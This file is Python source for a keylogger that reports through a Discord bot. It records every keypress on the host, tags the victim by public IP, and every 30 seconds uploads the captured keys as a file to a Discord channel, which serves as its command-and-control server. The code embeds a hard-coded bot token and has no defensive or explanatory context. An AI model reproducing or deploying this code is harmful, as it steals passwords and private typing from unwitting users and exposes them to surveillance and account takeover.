import keyboard
import tempfile
import requests
import discord
import time
import os

TOKEN = 'MTMxNjE2MDI2NDQ0NTYyNDMyMA.GXN6mw.nO8piWbCQrDrF2YcfjXICH6D2QpEZEALoiPPZ4'
DISCORD_SERVER_ID = 1309886404129587200
CATEGORY_ID = 1316159623816024146

intents = discord.Intents.default()
intents.messages = True
intents.guilds = True

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'Logged in as {client.user}')

    guild = client.get_guild(DISCORD_SERVER_ID)
    if guild is None:
        print("Guild not found")
        return

    category = guild.get_channel(CATEGORY_ID)
    if category is None:
        print("Category not found")
        return

    ip = requests.get('https://api.ipify.org').text.strip().replace('.', '_')
    existing_channel = discord.utils.get(category.channels, name=ip)
    
    if existing_channel:
        await existing_channel.delete()
    
    new_channel = await category.create_text_channel(name=ip)
    await new_channel.send(f"Connected to {requests.get('https://api.ipify.org').text.strip()}.")

    try:
        last_key_time = time.time()
        captured_keys = []

        while True:
            if time.time() - last_key_time > 600:
                break

            start_time = time.time()

            while time.time() - start_time < 30:
                event = keyboard.read_event()
                if event.event_type == keyboard.KEY_DOWN:
                    key_str = event.name
                    captured_keys.append(key_str)
                    last_key_time = time.time()

            temp_file_path = os.path.join(tempfile.gettempdir(), 'captured_keys.txt')
            with open(temp_file_path, 'w') as temp_file:
                for key in captured_keys:
                    temp_file.write(f"{key}\n")

            if captured_keys:
                with open(temp_file_path, 'rb') as f:
                    await new_channel.send(content="All keys logged from the last 30 seconds.", file=discord.File(f, filename='captured_keys.txt'))

            captured_keys = []

    except Exception as e:
        print(f"An error occurred: {e}")

client.run(TOKEN)